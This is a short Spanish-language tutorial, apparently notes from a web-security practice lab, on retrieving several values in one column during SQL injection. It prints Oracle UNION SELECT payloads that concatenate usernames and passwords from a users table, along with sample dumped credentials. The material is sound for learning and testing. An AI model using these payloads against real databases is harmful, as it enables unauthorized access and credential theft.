# Recuperar múltiples valores dentro de una sola columna

Se puede recuperar valores juntos dentro de una única columna concatenando los valores. Se pueden incluir separadores para distinguir los valores.

## Ejemplo en Oracle

Payload inyectado:

```
' UNION SELECT username || '~' || password FROM users--
```

Esto utiliza el operador `||` (concatenación de cadenas en Oracle). La consulta inyectada concatena los valores de los campos `username` y `password`, separados por el carácter `~`.

Resultado (ejemplo):

```
administrator~s3cure
wiener~peter
carlos~montoya
```

## Notas

* Diferentes bases de datos tienen diferente sintaxis para concatenar cadenas.
* En el laboratorio se muestra un ejemplo combinado:

```
' UNION SELECT NULL,'a'--
```

Que puede transformarse en:

```
' UNION SELECT NULL,username ||'~'|| password FROM users--
```


